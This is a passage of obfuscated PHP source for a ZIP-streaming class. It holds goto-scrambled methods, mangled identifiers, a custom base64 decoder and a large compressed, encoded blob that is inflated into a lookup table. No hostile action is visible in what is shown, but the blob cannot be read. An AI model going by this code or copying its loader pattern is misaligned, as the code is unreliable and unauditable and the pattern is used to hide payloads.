$_SERVER[¶ªÕß‚ØÁŸ]; list($c÷İÆİ©«Ï, $c¦èˆìØİ, $BÌ»¢³¦˜Í, $C³„ˆÂ¶˜, $d¹º¾ëùöÅ, $C´ÕèñÄ¢) = $FÆß‘Ç‰Â‰; $a÷‘Âƒº²¥ = $Fœ¾°ÎÕá‘[33]; goto B¶¬âñ; f‹ø°óÊ´: $this->send($AÉÉˆÁ˜¼Ë); $this->cdr_ofs += strlen($AÉÉˆÁ˜¼Ë); goto C†²»ˆƒéë; dÅŒŠä¬Õ¶: $cùƒ°öˆØ = $this->packFields($eä˜¶¨‚†); $E—¶‡ƒÇ = $this->packFields($fî‡”¥ïêš); $AÉÉˆÁ˜¼Ë = $cùƒ°öˆØ . $c÷İÆİ©«Ï . $a÷‘Âƒº²¥ . $E—¶‡ƒÇ; goto f‹ø°óÊ´; B¶¬âñ: $DÔÃÛ‰åÜ× = $this->dosTime(time()); $eä˜¶¨‚† = array(array($Fœ¾°ÎÕá‘[2016], static::CDR_FILE_SIGNATURE), array($Fœ¾°ÎÕá‘[2017], static::ZIP_VERSION_64), array($Fœ¾°ÎÕá‘[2017], static::ZIP_VERSION_64), array($Fœ¾°ÎÕá‘[2017], 8), array($Fœ¾°ÎÕá‘[2017], $c¦èˆìØİ), array($Fœ¾°ÎÕá‘[2016], $DÔÃÛ‰åÜ×), array($Fœ¾°ÎÕá‘[2016], $BÌ»¢³¦˜Í), array($Fœ¾°ÎÕá‘[2016], 4294967295), array($Fœ¾°ÎÕá‘[2016], 4294967295), array($Fœ¾°ÎÕá‘[2017], strlen($c÷İÆİ©«Ï)), array($Fœ¾°ÎÕá‘[2017], 32), array($Fœ¾°ÎÕá‘[2017], strlen($a÷‘Âƒº²¥)), array($Fœ¾°ÎÕá‘[2017], 0), array($Fœ¾°ÎÕá‘[2017], 0), array($Fœ¾°ÎÕá‘[2016], 32), array($Fœ¾°ÎÕá‘[2016], 4294967295)); $fî‡”¥ïêš = array(array($Fœ¾°ÎÕá‘[2017], 1), array($Fœ¾°ÎÕá‘[2017], 28), array($Fœ¾°ÎÕá‘[2018], $d¹º¾ëùöÅ), array($Fœ¾°ÎÕá‘[2018], $C³„ˆÂ¶˜), array($Fœ¾°ÎÕá‘[2018], $C´ÕèñÄ¢), array($Fœ¾°ÎÕá‘[2016], 0)); goto dÅŒŠä¬Õ¶; C†²»ˆƒéë: } protected function addCdr64Eof() { goto b„²±öÁªï; b„²±öÁªï: $dóñ· Ÿ =& $_SERVER[¶ªÕß‚ØÁŸ]; $c‚¢Ÿë¢ê = count($this->files); $e«õëÊ¯åœ = $this->cdr_ofs; goto bÌŠÆÛô¤; D©¸ÁÕ‡™õ: $this->send($EØĞŞå„…); goto e§§Õ¢’; bÌŠÆÛô¤: $AíÀê‹±ö¬ = $this->ofs; $dïÚÌ¨ëˆ› = array(array($dóñ· Ÿ[2016], static::ZIP64_CDR_EOF_SIGNATURE), array($dóñ· Ÿ[2018], 44), array($dóñ· Ÿ[2017], static::ZIP_VERSION_64), array($dóñ· Ÿ[2017], static::ZIP_VERSION_64), array($dóñ· Ÿ[2016], 0), array($dóñ· Ÿ[2016], 0), array($dóñ· Ÿ[2018], $c‚¢Ÿë¢ê), array($dóñ· Ÿ[2018], $c‚¢Ÿë¢ê), array($dóñ· Ÿ[2018], $e«õëÊ¯åœ), array($dóñ· Ÿ[2018], $AíÀê‹±ö¬)); $EØĞŞå„… = $this->packFields($dïÚÌ¨ëˆ›); goto D©¸ÁÕ‡™õ; e§§Õ¢’: } protected function addCdr64Locator() { goto aäç ¬ñ‚°; B•ÂÄ³ªš³: $E‰µá®ôÈí = $this->ofs; $d±¤Üö¤¡Ñ = array(array($eãÕ¼­‘Ó[2016], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($eãÕ¼­‘Ó[2016], 0), array($eãÕ¼­‘Ó[2018], $E‰µá®ôÈí + $B™¬ªº½âŒ), array($eãÕ¼­‘Ó[2016], 1)); $b¢¶Ùã„©… = $this->packFields($d±¤Üö¤¡Ñ); goto dò…ö¡Œ£; dò…ö¡Œ£: $this->send($b¢¶Ùã„©…); goto AìèÙóÀ”Í; aäç ¬ñ‚°: $eãÕ¼­‘Ó =& $_SERVER[¶ªÕß‚ØÁŸ]; $BõÓ­ê¥¬ù = count($this->files); $B™¬ªº½âŒ = $this->cdr_ofs; goto B•ÂÄ³ªš³; AìèÙóÀ”Í: } protected function addCdrEof() { goto DåÜ„ãËÙÉ; DåÜ„ãËÙÉ: $aò¹…Ğä¼ß =& $_SERVER[¶ªÕß‚ØÁŸ]; $dªİ®®æ = count($this->files); $A»©Ù®º² = $this->cdr_ofs; goto d÷§œìîíÙ; d÷§œìîíÙ: $b¹Ğ‡°›ì = $this->ofs; $f§“÷ù£Ä = $aò¹…Ğä¼ß[33]; $AˆŒ›­Ü©™ = array(array($aò¹…Ğä¼ß[2016], static::CDR_EOF_SIGNATURE), array($aò¹…Ğä¼ß[2017], 0), array($aò¹…Ğä¼ß[2017], 0), array($aò¹…Ğä¼ß[2017], $dªİ®®æ), array($aò¹…Ğä¼ß[2017], $dªİ®®æ), array($aò¹…Ğä¼ß[2016], 4294967295), array($aò¹…Ğä¼ß[2016], 4294967295), array($aò¹…Ğä¼ß[2017], strlen($f§“÷ù£Ä))); goto b†•Ü­†; b†•Ü­†: $FÂªùô»Éæ = $this->packFields($AˆŒ›­Ü©™) . $f§“÷ù£Ä; $this->send($FÂªùô»Éæ); goto e…Šªç’¢ğ; e…Šªç’¢ğ: } protected function addCdr() { foreach ($this->files as $f‘šÚÀøñµ) { $this->addCdrFile($f‘šÚÀøñµ); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $dÚ¨¦ÅˆË˜ =& $_SERVER[¶ªÕß‚ØÁŸ]; $aÅ…Ê¿šäÔ = $dÚ¨¦ÅˆË˜[212]; if ($this->outputName) { $bÍÖãïˆÒ = trim(str_replace(array($dÚ¨¦ÅˆË˜[123], $dÚ¨¦ÅˆË˜[55], $dÚ¨¦ÅˆË˜[103], $dÚ¨¦ÅˆË˜[77], $dÚ¨¦ÅˆË˜[62], $dÚ¨¦ÅˆË˜[996]), $dÚ¨¦ÅˆË˜[33], $this->outputName)); $BÛàÔ‚µç = rawurlencode($bÍÖãïˆÒ); $aÅ…Ê¿šäÔ .= "\73\40\146\x69\154\x65\x6e\141\155\145\x2a\x3d\x75\x74\146\55\70\x27\x27{$BÛàÔ‚µç}"; } $bÓİŒö¸ñ = array($dÚ¨¦ÅˆË˜[209] => $dÚ¨¦ÅˆË˜[2019], $dÚ¨¦ÅˆË˜[2020] => $aÅ…Ê¿šäÔ, $dÚ¨¦ÅˆË˜[2021] => $dÚ¨¦ÅˆË˜[2022], $dÚ¨¦ÅˆË˜[2023] => $dÚ¨¦ÅˆË˜[2024], $dÚ¨¦ÅˆË˜[2025] => $dÚ¨¦ÅˆË˜[2026]); foreach ($bÓİŒö¸ñ as $eßøƒ‘á¸ˆ => $a¯¡•ùŒØ®) { header($eßøƒ‘á¸ˆ . $dÚ¨¦ÅˆË˜[886] . $a¯¡•ùŒØ®); } } protected function send($EæÇ¿ä²ÊØ) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $EæÇ¿ä²ÊØ); } protected final function dosTime($CÙ”“¾ñÆ£) { $a¤ÜØÂÖõ =& $_SERVER[¶ªÕß‚ØÁŸ]; $céÛ¨¶ìÔæ = getdate($CÙ”“¾ñÆ£); if ($céÛ¨¶ìÔæ[$a¤ÜØÂÖõ[1729]] < 1980) { $céÛ¨¶ìÔæ = array($a¤ÜØÂÖõ[1729] => 1980, $a¤ÜØÂÖõ[2027] => 1, $a¤ÜØÂÖõ[2028] => 1, $a¤ÜØÂÖõ[2029] => 0, $a¤ÜØÂÖõ[2030] => 0, $a¤ÜØÂÖõ[2031] => 0); } $céÛ¨¶ìÔæ[$a¤ÜØÂÖõ[1729]] -= 1980; return $céÛ¨¶ìÔæ[$a¤ÜØÂÖõ[1729]] << 25 | $céÛ¨¶ìÔæ[$a¤ÜØÂÖõ[2027]] << 21 | $céÛ¨¶ìÔæ[$a¤ÜØÂÖõ[2028]] << 16 | $céÛ¨¶ìÔæ[$a¤ÜØÂÖõ[2029]] << 11 | $céÛ¨¶ìÔæ[$a¤ÜØÂÖõ[2030]] << 5 | $céÛ¨¶ìÔæ[$a¤ÜØÂÖõ[2031]] >> 1; } protected function packFields($EÛì±à ƒ) { $a©¶¿¬†ï´ =& $_SERVER[¶ªÕß‚ØÁŸ]; $B–‹å•ùŒ = $a©¶¿¬†ï´[33]; $D…Üä…ä¢˜ = array(); foreach ($EÛì±à ƒ as $e‚ÔŒêÕ°ß) { $B–‹å•ùŒ .= $e‚ÔŒêÕ°ß[0]; $D…Üä…ä¢˜[] = $e‚ÔŒêÕ°ß[1]; } array_unshift($D…Üä…ä¢˜, $B–‹å•ùŒ); return call_user_func_array($a©¶¿¬†ï´[2032], $D…Üä…ä¢˜); } protected function filterFilename($bËõ¸¡©Ÿ­) { $Eä”ö™ˆàš =& $_SERVER[¶ªÕß‚ØÁŸ]; return str_replace(array($Eä”ö™ˆàš[103], $Eä”ö™ˆàš[4], $Eä”ö™ˆàš[186], $Eä”ö™ˆàš[79], $Eä”ö™ˆàš[123], $Eä”ö™ˆàš[931], $Eä”ö™ˆàš[934], $Eä”ö™ˆàš[280]), $Eä”ö™ˆàš[80], $bËõ¸¡©Ÿ­); } } class ZipStream { } goto FòØ«Äå‰Õ; Cšìé®ã‚: if (!function_exists('_kodDe')) { function _kodDe($EŒÚ¶©ö‚Õ) { $EŒÚ¶©ö‚Õ = base64_decode($EŒÚ¶©ö‚Õ); $a¸ÏÃÏµ¿ = strlen($EŒÚ¶©ö‚Õ); $cÏÉ®¸­›© = ''; $f¼šÇ•êÙ = ord($EŒÚ¶©ö‚Õ[0]) - 30; for ($aî•ÒÊŠŒ‘ = 1; $aî•ÒÊŠŒ‘ < $a¸ÏÃÏµ¿; $aî•ÒÊŠŒ‘ += 2) { if ($aî•ÒÊŠŒ‘ + 1 < $a¸ÏÃÏµ¿) { $cÏÉ®¸­›© .= chr(ord($EŒÚ¶©ö‚Õ[$aî•ÒÊŠŒ‘ + 1]) + $f¼šÇ•êÙ); $cÏÉ®¸­›© .= chr(ord($EŒÚ¶©ö‚Õ[$aî•ÒÊŠŒ‘]) + $f¼šÇ•êÙ); } else { $cÏÉ®¸­›© .= chr(ord($EŒÚ¶©ö‚Õ[$aî•ÒÊŠŒ‘]) + $f¼šÇ•êÙ); } } return $cÏÉ®¸­›©; } } define("\266\252\325\337\202\330\301\237", "\210\222\306\357\233\343\342\364"); $_SERVER[¶ªÕß‚ØÁŸ] = explode("\x7c\x1\x7c\x3\x7c\x1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\175\7\140\133\305\371\70\233\22\112\331\253\254\207\223\20\17\15\257\54\47\166\42\133\262\255\104\266\214\44\307\111\54\107\74\111\117\322\213\45\75\371\275\47\171\44"."\201\102\30\141\103\331\353\117\31\141\265\4\22\366\56\173\265\120\12\204\262\12\5\222\60\132\112\51\141\265\300\377\366\335\173\222\151\373\243\165\164\367\335\167\367\156\174\367\335\167\167\337\367\335\225\353\336"."\273\164\313\171\317\275\367\341\352\35\127\357\274\172\307\17\257\275\343\326\165\353\161\30\374\355\4\376\105\341\243\316\374\311\16\350\277\235\163\307\76\332\273\123\303\76\147\117\374\263\156\316\170\343\171\143\63".strrev('ıj{s_Ÿ|¸=ŠŞG®á=”İ›/£ê°¼—Ğñu lzÿÖşï³~w;†à¿?]ÓÓ{9EÛv')."\xe6\x75\xd3\xcf\x5d\xfd\xec\xce\xd2\x27\xf2\x87\xf1\xc2\xfd\xd1\xba\xb5\x63\x9b\x1f\x7b\xeb\xbe\xd\x75\x87\xff\x32\x17\xfe\x6a\x87\x4f\xf6\x6b\xff\xe7\x3e\x97\xdf\x79\x4b\xfa\x8b\x25\xc3\x9f\x3d\xf4\xc3\xad\xbd\x9f\x2f\xa\x3e"."\xf9\x71\x2a\x76\xe1\xd8\xd9\x3b\x3e\x78\xcf\x91\x47\x3f\x3c\xfb\x90\x6f\xa7\xed\xfd\xee\x3\xcf\x75\xff\xe9\x25\xf7\xc1\x3b\xb5\x5f\xfa\xe6\x5e\x87\x2c\xda\x63\xd7\xcc\xef\x8f\xdb\x7d\xa7\xf1\x1b\x3f\x1d\x38\xfd\xfb\xd5\xfb\xb8"."\343\323\26\37\233\173\364\342\363\123\47\57\135\172\372\327\352\374\5\57\375\371\265\307\27\145\66\237\131\175\305\365\163\127\275\360\307\232\53\156\60\146\255\230\166\375\320\143\317\115\74\163\106\343\242\177\365"."\64\355\275\373\262\317\177\233\132\373\315\56\337\54\156\114\136\367\301\136\317\46\372\103\243\117\375\376\110\375\323\263\33\315\27\35\23\323\237\371\344\225\316\351\317\74\363\223\53\167\177\164\352\171\137\15\376"."\xf4\xac\xdb\x2e\x3c\xf5\xfd\x65\xab\x1e\x3c\x6b\xc9\xa0\xeb\x8a\xb5\xab\x5d\x57\xee\x3f\xfa\xf7\x13\xb7\x1d\xf5\xdd\xdd\xc7\x84\x17\x14\xf2\x27\x5d\xbc\x71\x87\x8d\x6f\xdc\xb1\xc3\xc1\x17\xcd\xfc\xcd\xbb\x9d\x4b\xb6\x2d\xb8\x71"."\356\131\257\354\67\353\210\375\336\170\346\251\105\312\271\373\357\364\316\326\207\67\355\331\346\77\141\307\322\201\33\366\175\147\247\35\166\300\35\335\202\177\244\274\146\112\312\230\152\230\6\6\44\264\174\112\115".base64_decode('47Cax79u/GOMZFVTweFYbzASC/f39flCkRgpUUzPaUkSKsi6nCOFFxTdAJ8Si4sVtIKSt0A4ICmb')."\162\134\66\110\111\336\366\230\327\327\27\10\56\213\105\226\365\371\10\106\74\66\122\124\364\161\34\103\301\260\51\353\146\104\315\51\14\143\124\147\365\152\367\165\371\173\245\110\310\323\33\366\164\104\374\301\136"."\xc\xee\x8\xf6\xf4\xf8\x23\xe5\xf0\x50\x30\x10\x68\xf7\x74\x2c\x2e\x4f\xe9\xb\x79\xba\x7a\x3c\x12\xa8\x5f\x56\x89\xa9\xf9\x94\x56\x2d\x1d\x87\x53\x8e\x93\x6a\x70\xa0\x53\x55\xb2\x49\x1c\xcc\xcb\xb4\x3a\xe6\x78\x81\x84\x22\x2c"."\4\306\40\137\314\146\161\244\227\205\110\375\225\224\134\314\222\76\363\212\221\202\256\346\144\332\364\305\312\70\203\342\200\134\64\65\65\237\300\21\337\230\251\313\34\16\152\234\320\225\234\222\47\105\205\175\1"."\137\107\104\202\325\224\72\103\301\36\211\14\105\116\66\114\105\227\6\272\175\41\237\4\253\336\72\3\265\170\206\204\363\365\367\202\16\221\74\201\200\64\131\11\246\222\53\320\142\160\236\12\205\5\103\136\137"."\x48\x6a\x5f\x26\xf1\x7e\x4a\x68\xb9\x9c\x96\x77\x81\x52\xc0\x78\x9a\x42\x55\x7d\xa1\x10\xe\x38\x8\x5\x7\xfc\x70\xe8\x48\x24\xd8\xd9\x19\xf6\xb1\x18\x69\xdc\xb1\x1\x50\x93\x26\x42\xa5\x96\x58\x32\x95\x35\x63\x25\x39\x5b\xa4"."\304\72\214\177\147\220\37\362\33\223\123\152\126\11\253\23\212\77\57\102\160\30\206\142\151\305\214\201\271\143\202\172\22\142\157\367\204\375\35\261\76\117\244\233\364\173\241\340\206\175\237\325\344\244\253\220\51"."\140\350\24\374\323\114\132\235\121\22\303\61\71\256\351\246\102\110\247\230\317\252\371\141\221\42\64\203\174\141\104\315\253\105\62\165\110\203\64\215\315\143\22\50\122\154\205\102\162\40\233\106\146\70\250\162\11"."\x7\x5b\xdb\xf0\xef\x3c\x82\x14\x87\xcd\x29\x29\xba\x19\x53\xf2\x9\x2d\xa9\xe6\x9\x53\x58\x40\x3a\x80\x4c\x3\xd9\xcc\x78\x75\x15\xe0\x91\x2\x35\x57\x42\x2b\x8c\xf7\x68\x25\xa1\x73\x2\x6c\xce\xa7\xb4\x6c\x52\xd1\x79\xbc\x0"."\xb2\x8b\x29\xa4\x31\xa0\xa3\x79\xee\xde\x62\x4e\x44\x61\xd1\x44\x46\xcd\x26\x75\xca\x2a\x7e\xc\xb3\x81\x14\xab\x98\x26\x68\x86\x41\x6b\xda\x5f\x80\x43\x11\x56\x74\xa1\xf6\x9d\xa0\x98\x60\xd1\x14\x81\x45\x84\xd6\xa9\xe9\x39\x2f"."\140\107\244\167\300\44\124\373\53\44\14\323\151\230\24\72\305\105\330\150\365\340\211\316\357\207\6\27\202\177\152\10\117\215\222\252\145\224\154\66\246\214\51\144\272\346\222\63\15\132\173\267\21\127\363\156\0"."\301\121\177\60\226\221\215\114\117\162\146\14\345\242\254\72\251\214\161\252\342\354\44\152\231\116\260\277\173\65\323\47\60\374\254\226\220\263\142\113\161\70\143\232\205\260\222\117\166\62\62\117\152\243\171\324\141"."\5\205\322\246\327\41\45\245\36\151\231\324\335\242\266\120\352\2\264\222\32\347\374\67\143\346\262\54\104\133\313\140\6\3\232\143\204\46\252\110\134\31\63\111\47\111\363\22\31\131\7\303\327\132\64\123\316".base64_decode('OWw6ZdWEbKpa3q0lTMV0GqauyKS0qnkSpAjIT2pxLjqXO/AkdUZ0OW+kFN3pI+TdIoF+ZvyUonlV')."\xa3\xa0\x19\x2a\xfc\x4c\x8b\x24\x9b\xa6\x9c\xc8\x40\x5e\xc4\x8b\x6f\xfd\x11\x7c\x15\xce\x5d\xa5\xc\xd7\x93\x48\x28\x86\xe1\x84\x59\x74\x2d\xeb\xf4\x64\xb3\xda\xa8\x33\xa8\xab\x69\x15\xe4\xa9\xb5\x55\x13\xf0\xc9\x16\x89\x32\xf1"."\202\252\53\6\215\112\135\75\21\202\14\152\245\70\373\164\71\235\223\133\244\102\61\16\172\206\314\317\12\60\214\115\276\336\42\45\140\324\41\345\212\206\351\324\25\300\14\125\260\354\222\301\363\247\234\75\160".base64_decode('PFUl6QyDNYOAm+qbJUBGEk3D0O5IpC/m7wSiQa8v1uOJdBDG5zPlNK1zAKwErEgKXOoEUw4SWi/o').base64_decode('Iw7s00YVHXy4fbxFGtaScW3MRZM6CTumyLBHC6YzJOfTsH/i46ZCyNEopa0dGlDyaTNDM4Z9oSW+').strrev('vZ,E9 N¼c°]ü¦‡“…M1Åör|Òa>º	%!gE‚Ÿ£ƒÈ¨DBxŒì,P').strrev('¤JÎU DÔ–~±©®'."\r".'Üyå[hv«¯Qƒ5µ¿Á8ÕÖM[S4kPj7!R.$	=AK&î°©Í@')."\321\145\30\365\122\160\361\217\164\0\134\41\205\151\156\353\72\14\14\371\216\355\367\205\43\261\36\137\244\73\350\45\137\360\171\110\50\240\341\251\111\133\64\210\177\206\310\10\2\301\45\255\44\300\122\250\313"."\x59\xc8\x80\x28\xbd\x29\x94\x9\xa4\xd5\x14\xe7\xeb\x7e\x20\x5e\x91\x8e\xc5\x9c\x8f\x47\xc2\x6a\xae\x40\x19\x94\x99\x29\xe6\xe2\x42\xd0\xcd\x4b\x20\xb4\x0\x86\x8c\xb1\x25\x8d\xad\x41\x60\xb1\xc5\xa1\x16\x37\xc9\x32\xbd\xb1\x93"."\62\133\167\270\11\374\237\163\326\244\226\223\251\134\214\46\256\222\304\63\27\203\152\55\51\335\212\314\27\65\123\207\153\377\50\215\23\224\36\305\314\150\244\237\201\14\101\252\124\144\165\243\265\114\52\131\205"."\xf6\x52\x46\xa1\x5c\x1a\x8\x7b\x25\xd6\x79\x5\x5d\x49\xa9\x84\x6e\x81\x74\x7\xe0\x9c\xb\xab\x46\x8\x64\x82\xd2\x16\x8d\xf\x40\xa1\x98\x3\x4c\xce\xb0\x65\x83\x33\x7d\x18\x11\x56\xe6\xce\xfe\x40\x20\xd6\x11\xec\x8d\x0\xc1"."\x18\x43\x6\x42\xfe\x88\x8f\x52\x84\xc7\x1b\xf3\x74\xf4\xb1\x25\x8c\xf\x13\x41\x80\xd3\xb3\x9c\xbd\x61\x48\xa9\x51\xe0\xfb\x7c\x81\xe0\x2c\x97\x2e\x74\x90\xa5\xe2\x30\xe0\x85\x5\x2d\x6f\x28\x4e\x22\x78\x39\x93\x9c\xf9\x62\x8c".base64_decode('eTbOW5aDi+NjTjk34cwppuxkVbeub1JEXCb9ZAg4s8yCRRXsdujC2hcMkwwLIBRII3FFJ/Xo6ydJ')."\x39\x61\xf8\xbb\x7c\x11\xba\x28\xca\x44\x64\xf1\xc\x84\x29\x87\x2b\x2\x44\x5d\x9d\x90\x79\xe3\x16\xd0\x8a\x90\x42\xc7\x72\x59\x2e\x59\xc5\x54\xcb\xc0\xc5\xb4\xf8\x4a\xc0\xbe\x0\xb5\xc9\x95\x9a\xeb\xe4\x83\x14\xe9\xf6\xf7\x2e"."\216\365\4\275\276\100\314\337\13\330\103\244\34\336\337\347\365\320\121\27\341\355\101\52\354\22\150\77\140\20\113\74\1\277\35\335\267\324\37\216\204\53\46\1\130\277\317\226\2\166\176\175\41\137\247\177\51".base64_decode('i3b6fQFvONbh6ejmOL2eHhKJpeDey3Bb8WOA04XZDi5WgrtRjQn04nYpRjcCMU4gYNVSCFGS5sI9')."\60\152\11\21\206\23\132\221\222\51\223\336\162\224\63\344\144\62\65\145\272\42\125\343\237\32\311\23\226\314\102\214\361\200\370\70\13\242\146\320\70\220\323\310\367\45\302\165\313\152\20\203\70\355\112\112\323".base64_decode('lR8DeFImIwxbHEwYngZGwIM224AS0IjE6CQ0wMbAQ6uT4hvdWLDPF/LAbXJsIBTs7SIZRjMKrYCf')."\x74\x7f\x35\x95\x62\xc8\x6e\xd9\xe4\xbc\x8\x88\x20\x32\x99\x44\x39\xde\xe9\x2b\x35\xda\x95\xab\xf1\xcf\x31\xf8\x7\x48\x6d\xe4\xe3\x4a\x9e\xf6\x7a\x1c\x72\x64\xc6\x31\xe8\xe6\x3\xcc\x16\xca\x4d\xb5\x22\xfb\x5a\x5c\xd3\xb2\x74"."\2\203\205\230\61\12\266\317\136\151\120\42\31\243\134\251\216\56\127\144\125\210\4\27\373\172\143\224\262\160\114\240\106\14\0\73\327\140\210\164\210\251\15\323\235\13\116\14\371\302\164\372\353\312\110\121\245"."\335\345\166\325\21\52\126\300\302\103\76\357\136\21\35\255\253\36\164\326\271\206\100\240\246\166\41\216\222\130\324\145\211\116\43\371\213\72\313\15\345\223\152\143\101\115\113\324\35\165\127\57\150\31\364\70\47".base64_decode('ZOdEvXOuc6gu6qqpI4ChVY2O5jUQASAumDoEflqjC6ZHncccf9zCwejQjJa6o6OuqdHRodqaBfQ7')."\211\242\16\166\145\211\161\126\325\144\135\65\250\22\220\133\30\112\36\361\102\1\201\46\114\250\5\16\135\65\153\15\205\203\61\124\322\74\307\240\63\132\67\264\100\310\47\200\354\337\2\62\13\140\314\31\206"."\347\161\56\207\55\143\131\341\274\47\364\121\314\47\70\167\205\363\42\56\47\10\37\120\323\171\66\205\300\112\316\166\303\126\161\171\325\164\374\273\206\16\144\132\241\353\61\74\126\323\11\165\26\363\352\10\75"."\161\310\53\43\44\240\231\224\276\343\212\71\252\120\362\0\160\113\34\20\7\335\257\201\44\41\226\105\322\31\371\2\337\47\51\150\323\100\132\121\210\101\171\153\224\305\222\112\236\214\323\36\4\333\110\310\5".strrev('”ş‚d»`a'."\n".'bÎ‚Şšë¢’b²F6V\\ÊTs4ŒìíŠâ8Ó„0å¾Úx‹0´,%').strrev('øø‘˜#GüwcÅCSZj­'."\r".'Lì²hrJƒ‹F®àh™kn1S ½;.7p“mjZÀ')."\100\310\112\230\154\301\55\73\46\213\61\16\10\253\300\316\27\64\235\255\263\20\316\305\125\123\63\345\54\103\203\151\21\10\241\334\206\256\325\144\163\216\7\60\300\231\20\134\235\205\103\104\304\41\173\331\11"."\31\73\152\20\316\257\0\314\41\104\133\253\50\203\316\203\51\320\301\227\47\277\327\111\206\317\263\324\351\47\62\73\13\250\124\272\224\301\104\66\51\324\320\212\172\102\141\70\26\361\302\224\165\260\132\161\141"."\16\212\135\302\371\46\250\263\3\36\75\70\340\152\352\0\2\236\3\36\361\70\270\220\352\340\247\6\16\46\162\72\210\44\352\340\245\223\240\337\353\120\15\57\222\210\121\271\50\211\326\331\314\300\75\170\126"."\x1e\x77\xe0\xfa\x7\x94\x92\x92\x75\xd0\xda\x3b\x68\xa3\x1c\xb4\x5\xe\xb4\xc5\xf0\x92\xda\xf4\x3\xca\x20\xb5\x41\x41\xc0\x1e\x32\xe\x38\x10\x70\x54\x69\x29\x30\x48\xbb\x81\xc9\xd1\xe\x2e\x63\x3b\xd2\xba\x56\x2c\xf4\xd1\x2f"."\x9\x31\x5c\x19\x2\xe0\x35\x65\x80\x90\xa6\x99\xe\xba\xe7\x61\x81\x1e\xc6\x7b\x60\x75\x78\x68\x9\x1f\x6a\x5e\x7b\xb6\x70\x92\x26\xe0\xb8\xbd\xe\x18\xa\xd3\x3b\xe5\x92\x38\xc0\x15\x7\x3b\x6f\x25\xc\x7e\x4c\xcb\xf\xf0\xb8"."\xa0\x64\xdf\x7b\xd8\x4f\x84\x78\x27\xf2\x4a\x44\xe4\x74\x58\xf8\xbc\x29\xa7\xe9\xb7\x2b\xa4\xe2\x70\x48\x49\x8c\x27\xf8\x7e\xc6\x2b\x6c\x90\xac\x31\x36\xf4\x88\xe\x2b\x11\x53\xe5\xa1\x67\x4\xc2\x68\x6d\xca\x1e\x7b\x50\xca\xe6"."\164\104\310\307\102\154\223\122\67\157\123\260\300\327\32\310\12\302\200\3\12\223\235\202\202\234\267\24\311\332\50\33\11\52\305\214\322\213\22\205\302\204\372\323\326\133\312\205\121\76\63\151\23\45\130\200\103"."\xe0\xd6\x70\x74\x9c\x7c\x88\x85\x28\xf9\x51\xb5\x18\xee\xd7\x58\x8e\xed\x29\x58\x47\xdb\xd8\x10\xec\xf7\x3e\x35\x3f\xae\xe6\xc5\xed\x3a\x87\x72\x6e\xc7\x89\x2\x92\x37\x8f\xe1\x3e\x9e\x2c\x8c\x79\xb\x3f\xe\x70\x90\x63\x2\x7"."\74\71\27\270\36\337\326\202\332\243\123\173\136\167\122\222\255\346\164\2\72\255\121\76\37\373\301\6\51\146\43\125\102\244\31\131\347\275\114\347\30\44\154\326\52\3\242\360\250\200\226\222\113\234\321\133\362"."\x8\x33\xc3\x30\xc7\xd9\xc9\x86\x10\xb4\x16\x8a\xa3\xde\xc9\x22\xdd\x6c\xdf\x57\x29\x2a\x4e\x3a\xd5\x8\xb0\x7b\x8\x6b\x18\xb5\x34\xa2\x55\x8c\x22\x79\x40\x2\x92\x0\x3d\x19\xa3\x82\x7d\xcc\x76\xb2\x0\xa2\xc2\x48\xc5\x2c\x87"."\x10\xb8\x1a\x1e\xc6\xfa\x80\x48\x93\x5\x23\xa0\xbb\xe0\x24\xe9\x82\x8c\x4d\x5c\x85\xf8\xa\x5\x99\x29\xe\xb\x48\x5\x3b\xf\xb4\xf0\xea\x4a\xb\x9f\x9d\x5b\xdb\xa0\xb6\x28\xff\xa8\x85\xef\x94\xad\x4e\x44\x2c\x21\x52\x68\x3d"."\241\372\44\330\57\272\164\314\331\134\100\360\40\327\73\216\172\141\171\343\323\167\225\61\156\230\112\216\160\302\65\266\336\61\301\306\46\56\353\56\35\324\210\127\224\57\11\104\354\50\62\300\220\35\3\27\37"."\xd0\xa8\x14\xc\xe9\xdf\x97\x54\x4d\x8\x81\xdc\x4c\xa3\xe7\x54\x1c\x51\x60\xf3\xc\x26\x14\x88\xba\xc4\x55\x36\x6\x59\x75\x98\xe4\x72\x4c\xb7\x60\x56\xe2\xe4\xae\x5a\xc4\x73\x5d\x7c\xed\x11\x57\x2e\xf1\x22\x9\xa2\xf1\x96\xc3"."\213\51\34\22\56\204\163\354\246\12\1\135\206\251\25\170\212\20\305\311\102\22\57\124\300\142\235\217\152\10\126\200\44\222\17\170\27\42\134\222\27\311\316\230\270\135\131\200\341\22\131\221\107\327\51\221\340"."\346\301\263\33\0\24\101\160\272\206\351\241\141\45\216\214\13\367\225\370\105\57\56\12\176\330\205\27\50\227\234\114\6\351\211\232\30\56\107\25\317\21\52\27\204\356\336\131\121\102\254\62\272\47\233\345\127".strrev('n“+`Åy¨Ì!Ç+@|›+Iÿ>ekÈ»I«ñÆ|CFÓ®™1‚Wi˜!"u³I‰3\\ğY¤øög')."\x54\xe2\x33\xff\x49\xbe\xb1\x48\xbd\x56\x41\x46\x94\x60\xc8\x72\xc8\x9b\x2b\x76\x2b\x24\xff\xc9\x68\x1\xa6\x9\xc7\x49\x60\xf7\x4\x0\xe2\x3a\xc2\xce\x4c\x38\xdf\x11\x96\x4a\xb4\xec\xc4\x4c\xcb\xb2\x1f\x42\x65\x8\xf3\xc1\x32"."\xc4\x60\xfe\xe1\x16\x75\xea\x5a\xce\x1f\x4\xf3\xab\x32\xd1\xd9\xf1\x14\x7a\x6a\x84\x98\xda\x18\xdb\x8c\x89\x99\x0\x91\xc0\x55\x68\xb2\x32\x69\x32\x2b\x8a\x2f\x59\xb7\xbd\x71\x12\xd1\x74\x7a\xe0\xf\x5f\xfe\xf3\x33\x1c\x1c\x4e"."\115\44\14\205\354\6\301\377\166\135\275\13\16\163\255\247\123\226\256\322\336\177\152\337\256\23\277\134\25\325\107\117\175\377\251\306\355\27\137\276\142\144\323\264\67\67\51\317\137\234\174\347\327\163\343\176\227"."\157\371\264\113\252\56\331\174\335\127\57\136\223\323\277\231\352\73\143\305\211\53\136\272\266\365\316\205\173\336\171\337\236\177\220\74\373\177\361\346\53\347\256\76\323\165\337\35\253\77\174\257\171\216\367\255\327"."\337\176\375\365\313\336\371\335\277\67\217\155\135\356\175\74\370\360\127\37\354\36\174\3